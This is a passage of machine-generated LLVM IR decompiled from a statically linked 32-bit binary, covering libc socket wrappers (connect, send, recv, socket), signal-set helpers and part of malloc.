  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051bbf = call i32 @__socketcall(i32 2, i32 %v15_8051ba0)
  ret i32 %v2_8051bbf
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v0_8051bc8 = load i32, i32* @esi, align 4
  %v0_8051bc9 = load i32, i32* @ebx, align 4
  %v15_8051bca = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v0_8051be4 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8051bea = icmp eq i32 %v0_8051be4, 0
  %v1_8051bee = icmp eq i1 %v1_8051bea, false
  br i1 %v1_8051bee, label %dec_label_pc_8051bfc, label %dec_label_pc_8051bf0

dec_label_pc_8051bf0:                             ; preds = %entry
  %v2_8051bf3 = call i32 @__socketcall(i32 3, i32 %v15_8051bca)
  br label %dec_label_pc_8051c14

dec_label_pc_8051bfc:                             ; preds = %entry
  %v4_8051bfc = call i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v0_8051bc9)
  store i32 %v4_8051bfc, i32* @ebx, align 4
  %v2_8051c06 = call i32 @__socketcall(i32 3, i32 %v15_8051bca)
  store i32 %v2_8051c06, i32* @esi, align 4
  %v0_8051c0d = load i32, i32* @ebx, align 4
  store i32 %v0_8051c0d, i32* @eax, align 4
  %v1_8051c0f = call i32 @__libc_disable_asynccancel(i32 3)
  %v0_8051c14.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c14

dec_label_pc_8051c14:                             ; preds = %dec_label_pc_8051bf0, %dec_label_pc_8051bfc
  %v0_8051c14 = phi i32 [ %v2_8051bf3, %dec_label_pc_8051bf0 ], [ %v0_8051c14.pre, %dec_label_pc_8051bfc ]
  store i32 %v0_8051bc9, i32* @ebx, align 4
  store i32 %v0_8051bc8, i32* @esi, align 4
  ret i32 %v0_8051c14

; uselistorder directives
  uselistorder label %dec_label_pc_8051c14, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v15_8051c1c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051c3b = call i32 @__socketcall(i32 6, i32 %v15_8051c1c)
  ret i32 %v2_8051c3b
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v15_8051c44 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8051c73 = call i32 @__socketcall(i32 15, i32 %v15_8051c44)
  ret i32 %v2_8051c73
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v15_8051c7c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_8051c93 = call i32 @__socketcall(i32 4, i32 %v15_8051c7c)
  ret i32 %v2_8051c93
}

define i32 @__libc_recv() local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v0_8051c9c = load i32, i32* @esi, align 4
  %v0_8051c9d = load i32, i32* @ebx, align 4
  %v12_8051c9e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %tmp7, i32* %stack_var_-24, align 4
  %v0_8051cc0 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8051cc6 = icmp eq i32 %v0_8051cc0, 0
  %v1_8051cca = icmp eq i1 %v1_8051cc6, false
  br i1 %v1_8051cca, label %dec_label_pc_8051cd8, label %dec_label_pc_8051ccc

dec_label_pc_8051ccc:                             ; preds = %entry
  %v2_8051ccf = call i32 @__socketcall(i32 10, i32 %v12_8051c9e)
  br label %dec_label_pc_8051cf0

dec_label_pc_8051cd8:                             ; preds = %entry
  %v4_8051cd8 = call i32 @__libc_enable_asynccancel(i32 %tmp7, i32 %tmp6, i32 %tmp4, i32 %tmp2)
  store i32 %v4_8051cd8, i32* @ebx, align 4
  %v2_8051ce2 = call i32 @__socketcall(i32 10, i32 %v12_8051c9e)
  store i32 %v2_8051ce2, i32* @esi, align 4
  %v0_8051ce9 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ce9, i32* @eax, align 4
  %v1_8051ceb = call i32 @__libc_disable_asynccancel(i32 10)
  %v0_8051cf0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051cf0

dec_label_pc_8051cf0:                             ; preds = %dec_label_pc_8051ccc, %dec_label_pc_8051cd8
  %v0_8051cf0 = phi i32 [ %v2_8051ccf, %dec_label_pc_8051ccc ], [ %v0_8051cf0.pre, %dec_label_pc_8051cd8 ]
  store i32 %v0_8051c9d, i32* @ebx, align 4
  store i32 %v0_8051c9c, i32* @esi, align 4
  ret i32 %v0_8051cf0

; uselistorder directives
  uselistorder label %dec_label_pc_8051cf0, { 1, 0 }
}

define i32 @__libc_recvfrom() local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v0_8051cf8 = load i32, i32* @esi, align 4
  %v0_8051cf9 = load i32, i32* @ebx, align 4
  %v15_8051cfa = ptrtoint i32* %stack_var_-32 to i32
  store i32 %tmp11, i32* %stack_var_-32, align 4
  %v0_8051d2c = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8051d32 = icmp eq i32 %v0_8051d2c, 0
  %v1_8051d36 = icmp eq i1 %v1_8051d32, false
  br i1 %v1_8051d36, label %dec_label_pc_8051d44, label %dec_label_pc_8051d38

dec_label_pc_8051d38:                             ; preds = %entry
  %v2_8051d3b = call i32 @__socketcall(i32 12, i32 %v15_8051cfa)
  br label %dec_label_pc_8051d5c

dec_label_pc_8051d44:                             ; preds = %entry
  %v4_8051d44 = call i32 @__libc_enable_asynccancel(i32 %tmp11, i32 %tmp10, i32 %tmp8, i32 %tmp6)
  store i32 %v4_8051d44, i32* @ebx, align 4
  %v2_8051d4e = call i32 @__socketcall(i32 12, i32 %v15_8051cfa)
  store i32 %v2_8051d4e, i32* @esi, align 4
  %v0_8051d55 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d55, i32* @eax, align 4
  %v1_8051d57 = call i32 @__libc_disable_asynccancel(i32 12)
  %v0_8051d5c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051d5c

dec_label_pc_8051d5c:                             ; preds = %dec_label_pc_8051d38, %dec_label_pc_8051d44
  %v0_8051d5c = phi i32 [ %v2_8051d3b, %dec_label_pc_8051d38 ], [ %v0_8051d5c.pre, %dec_label_pc_8051d44 ]
  store i32 %v0_8051cf9, i32* @ebx, align 4
  store i32 %v0_8051cf8, i32* @esi, align 4
  ret i32 %v0_8051d5c

; uselistorder directives
  uselistorder label %dec_label_pc_8051d5c, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_8051d64 = load i32, i32* @esi, align 4
  %v0_8051d65 = load i32, i32* @ebx, align 4
  %v12_8051d66 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v0_8051d88 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8051d8e = icmp eq i32 %v0_8051d88, 0
  %v1_8051d92 = icmp eq i1 %v1_8051d8e, false
  br i1 %v1_8051d92, label %dec_label_pc_8051da0, label %dec_label_pc_8051d94

dec_label_pc_8051d94:                             ; preds = %entry
  %v2_8051d97 = call i32 @__socketcall(i32 9, i32 %v12_8051d66)
  br label %dec_label_pc_8051db8

dec_label_pc_8051da0:                             ; preds = %entry
  %v4_8051da0 = call i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8051da0, i32* @ebx, align 4
  %v2_8051daa = call i32 @__socketcall(i32 9, i32 %v12_8051d66)
  store i32 %v2_8051daa, i32* @esi, align 4
  %v0_8051db1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051db1, i32* @eax, align 4
  %v1_8051db3 = call i32 @__libc_disable_asynccancel(i32 9)
  %v0_8051db8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051db8

dec_label_pc_8051db8:                             ; preds = %dec_label_pc_8051d94, %dec_label_pc_8051da0
  %v0_8051db8 = phi i32 [ %v2_8051d97, %dec_label_pc_8051d94 ], [ %v0_8051db8.pre, %dec_label_pc_8051da0 ]
  store i32 %v0_8051d65, i32* @ebx, align 4
  store i32 %v0_8051d64, i32* @esi, align 4
  ret i32 %v0_8051db8

; uselistorder directives
  uselistorder label %dec_label_pc_8051db8, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8051dc0 = load i32, i32* @esi, align 4
  %v0_8051dc1 = load i32, i32* @ebx, align 4
  %v15_8051dc2 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* %stack_var_-32, align 4
  %v0_8051df4 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8051dfa = icmp eq i32 %v0_8051df4, 0
  %v1_8051dfe = icmp eq i1 %v1_8051dfa, false
  br i1 %v1_8051dfe, label %dec_label_pc_8051e0c, label %dec_label_pc_8051e00

dec_label_pc_8051e00:                             ; preds = %entry
  %v2_8051e03 = call i32 @__socketcall(i32 11, i32 %v15_8051dc2)
  br label %dec_label_pc_8051e24

dec_label_pc_8051e0c:                             ; preds = %entry
  %v4_8051e0c = call i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8051e0c, i32* @ebx, align 4
  %v2_8051e16 = call i32 @__socketcall(i32 11, i32 %v15_8051dc2)
  store i32 %v2_8051e16, i32* @esi, align 4
  %v0_8051e1d = load i32, i32* @ebx, align 4
  store i32 %v0_8051e1d, i32* @eax, align 4
  %v1_8051e1f = call i32 @__libc_disable_asynccancel(i32 11)
  %v0_8051e24.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051e24

dec_label_pc_8051e24:                             ; preds = %dec_label_pc_8051e00, %dec_label_pc_8051e0c
  %v0_8051e24 = phi i32 [ %v2_8051e03, %dec_label_pc_8051e00 ], [ %v0_8051e24.pre, %dec_label_pc_8051e0c ]
  store i32 %v0_8051dc1, i32* @ebx, align 4
  store i32 %v0_8051dc0, i32* @esi, align 4
  ret i32 %v0_8051e24

; uselistorder directives
  uselistorder label %dec_label_pc_8051e24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v15_8051e2c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8051e5b = call i32 @__socketcall(i32 14, i32 %v15_8051e2c)
  ret i32 %v2_8051e5b
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v15_8051e64 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051e83 = call i32 @__socketcall(i32 1, i32 %v15_8051e64)
  ret i32 %v2_8051e83

; uselistorder directives
  uselistorder i32 (i32, i32)* @__socketcall, { 9, 8, 11, 10, 7, 6, 13, 12, 5, 4, 0, 3, 17, 2, 1, 14, 16, 15 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp1 = icmp slt i32 %arg1, 1
  br i1 %tmp1, label %dec_label_pc_8051e9e, label %dec_label_pc_8051e94

dec_label_pc_8051e94:                             ; preds = %entry
  %v1_8051e94 = add i32 %arg1, -64
  %v3_8051e94 = sub i32 63, %arg1
  %v4_8051e94 = and i32 %v3_8051e94, %arg1
  %v5_8051e94 = icmp slt i32 %v4_8051e94, 0
  %v6_8051e94 = icmp eq i32 %v1_8051e94, 0
  %v7_8051e94 = icmp slt i32 %v1_8051e94, 0
  %v3_8051e97 = icmp eq i1 %v7_8051e94, %v5_8051e94
  %v4_8051e97 = icmp eq i1 %v6_8051e94, false
  %v5_8051e97 = and i1 %v4_8051e97, %v3_8051e97
  br i1 %v5_8051e97, label %dec_label_pc_8051e9e, label %dec_label_pc_8051e99

dec_label_pc_8051e99:                             ; preds = %dec_label_pc_8051e94
  %v2_8051e99 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8051e9e

dec_label_pc_8051e9e:                             ; preds = %dec_label_pc_8051e94, %entry, %dec_label_pc_8051e99
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8051e94, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051e9e, { 2, 0, 1 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %arg1, align 4
  %v1_8051eba = add i32 %tmp1, 4
  %v2_8051eba = inttoptr i32 %v1_8051eba to i32*
  store i32 0, i32* %v2_8051eba, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8051ec4 = load i32, i32* @ebx, align 4
  %v15_8051ec5 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %arg1, i32* @ebx, align 4
  %v10_8051ed0 = icmp eq i32 %arg2, -1
  br i1 %v10_8051ed0, label %dec_label_pc_8051ede, label %dec_label_pc_8051ed5

dec_label_pc_8051ed5:                             ; preds = %entry
  %tmp15 = icmp slt i32 %arg1, 1
  br i1 %tmp15, label %dec_label_pc_8051ede, label %dec_label_pc_8051ed9

dec_label_pc_8051ed9:                             ; preds = %dec_label_pc_8051ed5
  %v7_8051edc = icmp sgt i32 %arg1, 64
  br i1 %v7_8051edc, label %dec_label_pc_8051ede, label %dec_label_pc_8051eef

dec_label_pc_8051ede:                             ; preds = %dec_label_pc_8051ed9, %dec_label_pc_8051ed5, %entry
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8051f45

dec_label_pc_8051eef:                             ; preds = %dec_label_pc_8051ed9
  store i32 %arg2, i32* %stack_var_-24, align 4
  store i32 0, i32* %stack_var_-12, align 4
  %v2_8051f04 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051f09 = call i32 @__sigaddset(i32 %v2_8051f04, i32 %arg1)
  %v2_8051f14 = call i32 @__GI___sigismember(i32 ptrtoint (i32* @global_var_805aa78.279 to i32), i32 %arg1)
  %v4_8051f33 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-24, i32 %v15_8051ec5)
  %v2_8051f3e = icmp slt i32 %v4_8051f33, 0
  br i1 %v2_8051f3e, label %dec_label_pc_8051f45, label %dec_label_pc_8051f42

dec_label_pc_8051f42:                             ; preds = %dec_label_pc_8051eef
  %v2_8051f42 = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_8051f45

dec_label_pc_8051f45:                             ; preds = %dec_label_pc_8051eef, %dec_label_pc_8051ede, %dec_label_pc_8051f42
  %v0_8051f45 = phi i32 [ -1, %dec_label_pc_8051eef ], [ -1, %dec_label_pc_8051ede ], [ %v2_8051f42, %dec_label_pc_8051f42 ]
  store i32 %v0_8051ec4, i32* @ebx, align 4
  ret i32 %v0_8051f45

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 3, 4, 0, 2, 1, 5 }
  uselistorder label %dec_label_pc_8051f45, { 2, 0, 1 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8051f5a = add i32 %arg2, -1
  %v1_8051f5d = urem i32 %v1_8051f5a, 32
  %v2_8051f5d = icmp eq i32 %v1_8051f5d, 0
  %v2_8051f60 = udiv i32 %v1_8051f5a, 32
  br i1 %v2_8051f5d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8051f63 = shl i32 1, %v1_8051f5d
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8051f65 = phi i32 [ 1, %entry ], [ %v5_8051f63, %bb ]
  %v2_8051f65 = mul nuw nsw i32 %v2_8051f60, 4
  %v3_8051f65 = add i32 %v2_8051f65, %arg1
  %v4_8051f65 = inttoptr i32 %v3_8051f65 to i32*
  %v5_8051f65 = load i32, i32* %v4_8051f65, align 4
  %v7_8051f65 = and i32 %v5_8051f65, %v6_8051f65
  %v8_8051f65 = icmp eq i32 %v7_8051f65, 0
  %v1_8051f69 = icmp eq i1 %v8_8051f65, false
  %v2_8051f69 = zext i1 %v1_8051f69 to i32
  ret i32 %v2_8051f69

; uselistorder directives
  uselistorder i32 %v1_8051f5d, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f70 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f70, i32* %stack_var_-4, align 4
  %v1_8051f7e = add i32 %arg2, -1
  %v1_8051f81 = urem i32 %v1_8051f7e, 32
  %v2_8051f81 = icmp eq i32 %v1_8051f81, 0
  %v2_8051f84 = udiv i32 %v1_8051f7e, 32
  br i1 %v2_8051f81, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8051f87 = shl i32 1, %v1_8051f81
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8051f89 = phi i32 [ 1, %entry ], [ %v5_8051f87, %bb ]
  %v2_8051f89 = mul nuw nsw i32 %v2_8051f84, 4
  %v3_8051f89 = add i32 %v2_8051f89, %arg1
  %v4_8051f89 = inttoptr i32 %v3_8051f89 to i32*
  %v5_8051f89 = load i32, i32* %v4_8051f89, align 4
  %v7_8051f89 = or i32 %v5_8051f89, %v6_8051f89
  store i32 %v7_8051f89, i32* %v4_8051f89, align 4
  %v2_8051f8e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f8e, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8051f81, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8051f9e = add i32 %arg2, -1
  %v1_8051fa1 = urem i32 %v1_8051f9e, 32
  %v2_8051fa1 = icmp eq i32 %v1_8051fa1, 0
  %v2_8051fa4 = udiv i32 %v1_8051f9e, 32
  br i1 %v2_8051fa1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_8051fa7 = shl i32 -2, %v1_8051fa1
  %v5_8051fa7 = sub nsw i32 32, %v1_8051fa1
  %v6_8051fa7 = lshr i32 -2, %v5_8051fa7
  %v7_8051fa7 = or i32 %v6_8051fa7, %v4_8051fa7
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8051fa9 = phi i32 [ -2, %entry ], [ %v7_8051fa7, %bb ]
  %v2_8051fa9 = mul nuw nsw i32 %v2_8051fa4, 4
  %v3_8051fa9 = add i32 %v2_8051fa9, %arg1
  %v4_8051fa9 = inttoptr i32 %v3_8051fa9 to i32*
  %v5_8051fa9 = load i32, i32* %v4_8051fa9, align 4
  %v7_8051fa9 = and i32 %v5_8051fa9, %v6_8051fa9
  store i32 %v7_8051fa9, i32* %v4_8051fa9, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8051fa1, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8051fb0 = load i32, i32* @eax, align 4
  %v6_8051fc3 = icmp ugt i32 %v0_8051fb0, 16777215
  br i1 %v6_8051fc3, label %dec_label_pc_8051fd4, label %dec_label_pc_8051fc5

dec_label_pc_8051fc5:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8051fb0, 256
  %v2_8051fb3 = udiv i32 %v0_8051fb0, 256
  %v2_8051fc5 = call i32 @llvm.ctlz.i32(i32 %v2_8051fb3, i1 true)
  %v3_8051fc5 = xor i32 %v2_8051fc5, 31
  %v5_8051fc5 = select i1 %tmp, i32 95, i32 %v3_8051fc5
  %v1_8051fc8 = add nuw nsw i32 %v5_8051fc5, 6
  %v2_8051fcb = urem i32 %v1_8051fc8, 32
  %v4_8051fcb = icmp eq i32 %v2_8051fcb, 0
  br i1 %v4_8051fcb, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8051fc5
  %v5_8051fcb = lshr i32 %v0_8051fb0, %v2_8051fcb
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8051fc5, %bb
  %v0_8051fcd = phi i32 [ %v0_8051fb0, %dec_label_pc_8051fc5 ], [ %v5_8051fcb, %bb ]
  %v1_8051fcd = urem i32 %v0_8051fcd, 4
  %v2_8051fd0 = mul nuw nsw i32 %v5_8051fc5, 4
  %v3_8051fd0 = or i32 %v1_8051fcd, 32
  %v4_8051fd0 = add nuw nsw i32 %v3_8051fd0, %v2_8051fd0
  br label %dec_label_pc_8051fd4

dec_label_pc_8051fd4:                             ; preds = %entry, %bb4
  %v0_8051fd5 = phi i32 [ 95, %entry ], [ %v4_8051fd0, %bb4 ]
  ret i32 %v0_8051fd5

; uselistorder directives
  uselistorder i32 %v2_8051fcb, { 1, 0 }
  uselistorder i32 %v0_8051fb0, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_8051fd4, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051fd6 = load i32, i32* @ebp, align 4
  %v0_8051fd7 = load i32, i32* @edi, align 4
  %v0_8051fd8 = load i32, i32* @esi, align 4
  %v0_8051fd9 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fd9, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8057ba8.280 to i32), i32* %stack_var_-72, align 4
  %v2_8051feb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051feb, i32* %eax.global-to-local, align 4
  %v4_8051ff0 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134559876, i32 ptrtoint (i32* @global_var_8057ba8.280 to i32))
  store i32 %v4_8051ff0, i32* %eax.global-to-local, align 4
  %v1_8051ffa = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8057ba8.280 to i32))
  store i32 %v1_8051ffa, i32* %eax.global-to-local, align 4
  %v0_8052002 = load i32, i32* %ebx.global-to-local, align 4
  %tmp145 = icmp ult i32 %v0_8052002, -32
  br i1 %tmp145, label %dec_label_pc_805201a, label %dec_label_pc_8052007

dec_label_pc_8052007:                             ; preds = %entry
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8052754

dec_label_pc_805201a:                             ; preds = %entry
  %v1_805201a = add i32 %v0_8052002, 11
  %tmp146 = icmp ult i32 %v1_805201a, 16
  br i1 %tmp146, label %dec_label_pc_8052031, label %dec_label_pc_805202a

dec_label_pc_805202a:                             ; preds = %dec_label_pc_805201a
  %v1_805202a = and i32 %v1_805201a, -8
  br label %dec_label_pc_8052031

dec_label_pc_8052031:                             ; preds = %dec_label_pc_805201a, %dec_label_pc_805202a
  %storemerge156 = phi i32 [ %v1_805202a, %dec_label_pc_805202a ], [ %v1_805201a, %dec_label_pc_805201a ]
  %v1_8052434 = phi i32 [ %v1_805202a, %dec_label_pc_805202a ], [ 16, %dec_label_pc_805201a ]
  store i32 %storemerge156, i32* %eax.global-to-local, align 4
  %v0_8052031 = load i8, i8* @global_var_805aa80.281, align 1
  %v1_8052031 = sext i8 %v0_8052031 to i32
  store i32 %v1_8052031, i32* @ebx, align 4
  %v3_8052037 = urem i8 %v0_8052031, 2
  %v4_8052037 = icmp eq i8 %v3_8052037, 0
  %v1_805203a = icmp eq i1 %v4_8052037, false
  br i1 %v1_805203a, label %dec_label_pc_8052054, label %dec_label_pc_805203c

dec_label_pc_805203c:                             ; preds = %dec_label_pc_8052031
  %v2_805203c = icmp eq i8 %v0_8052031, 0
  %v1_805203e = icmp eq i1 %v2_805203c, false
  br i1 %v1_805203e, label %dec_label_pc_805239d, label %dec_label_pc_8052044

dec_label_pc_8052044:                             ; preds = %dec_label_pc_805203c
  store i32 ptrtoint (i8* @global_var_805aa80.281 to i32), i32* %stack_var_-72, align 4
  %v2_8052049 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805aa80.281 to i32*))
  store i32 %v2_8052049, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_805aa80.281 to i32), i32* @ebp, align 4
  br label %dec_label_pc_805239d

dec_label_pc_8052054:                             ; preds = %dec_label_pc_8052031
  %v11_8052054 = trunc i32 %v1_8052434 to i8
  %v8_8052058 = icmp ugt i8 %v11_8052054, %v0_8052031
  br i1 %v8_8052058, label %dec_label_pc_8052078, label %dec_label_pc_805205a

dec_label_pc_805205a:                             ; preds = %dec_label_pc_8052054
  %v2_805205e = udiv i32 %v1_8052434, 8
  store i32 %v2_805205e, i32* @ecx, align 4
  %v1_8052061 = mul nuw i32 %v2_805205e, 4
  %v2_8052061 = add i32 %v1_8052061, ptrtoint (i32* @global_var_805aa7c.282 to i32)
  %v3_8052061 = inttoptr i32 %v2_8052061 to i32*
  %v4_8052061 = load i32, i32* %v3_8052061, align 4
  store i32 %v4_8052061, i32* %edx.global-to-local, align 4
  %v1_8052068 = icmp eq i32 %v4_8052061, 0
  br i1 %v1_8052068, label %dec_label_pc_8052078, label %dec_label_pc_805206c

dec_label_pc_805206c:                             ; preds = %dec_label_pc_805205a
  %v1_805206c = add i32 %v4_8052061, 8
  %v2_805206c = inttoptr i32 %v1_805206c to i32*
  %v3_805206c = load i32, i32* %v2_805206c, align 4
  store i32 %v3_805206c, i32* %eax.global-to-local, align 4
  store i32 %v3_805206c, i32* %v3_8052061, align 4
  br label %dec_label_pc_80520ad

dec_label_pc_8052078:                             ; preds = %dec_label_pc_805205a, %dec_label_pc_8052054
  %v8_8052078 = icmp ult i32 %v1_8052434, 255
  %v6_8052080 = icmp ugt i32 %v1_8052434, 255
  br i1 %v6_8052080, label %dec_label_pc_80520b5, label %dec_label_pc_8052082

dec_label_pc_8052082:                             ; preds = %dec_label_pc_8052078
  %v2_8052086 = udiv i32 %v1_8052434, 8
  store i32 %v2_8052086, i32* @ebp, align 4
  %v1_8052089 = mul nuw i32 %v2_8052086, 8
  %v2_8052089 = add i32 %v1_8052089, ptrtoint (i32* @global_var_805aaac.283 to i32)
  store i32 %v2_8052089, i32* @ecx, align 4
  %v1_8052090 = add i32 %v1_8052089, add (i32 ptrtoint (i32* @global_var_805aaac.283 to i32), i32 12)
  %v2_8052090 = inttoptr i32 %v1_8052090 to i32*
  %v3_8052090 = load i32, i32* %v2_8052090, align 4
  store i32 %v3_8052090, i32* %edx.global-to-local, align 4
  %v12_8052093 = icmp eq i32 %v3_8052090, %v2_8052089
  br i1 %v12_8052093, label %dec_label_pc_8052204, label %dec_label_pc_805209b

dec_label_pc_805209b:                             ; preds = %dec_label_pc_8052082
  store i32 %v1_8052434, i32* %ebx.global-to-local, align 4
  %v1_805209f = add i32 %v3_8052090, 12
  %v2_805209f = inttoptr i32 %v1_805209f to i32*
  %v3_805209f = load i32, i32* %v2_805209f, align 4
  store i32 %v3_805209f, i32* %eax.global-to-local, align 4
  store i32 %v3_805209f, i32* %v2_8052090, align 4
  %v0_80520a5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80520a5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520a5 = add i32 %v0_80520a5, 4
  %v3_80520a5 = add i32 %v2_80520a5, %v1_80520a5
  %v4_80520a5 = inttoptr i32 %v3_80520a5 to i32*
  %v5_80520a5 = load i32, i32* %v4_80520a5, align 4
  %v6_80520a5 = or i32 %v5_80520a5, 1
  store i32 %v6_80520a5, i32* %v4_80520a5, align 4
  %v0_80520aa = load i32, i32* @ecx, align 4
  %v1_80520aa = load i32, i32* %eax.global-to-local, align 4
  %v2_80520aa = add i32 %v1_80520aa, 8
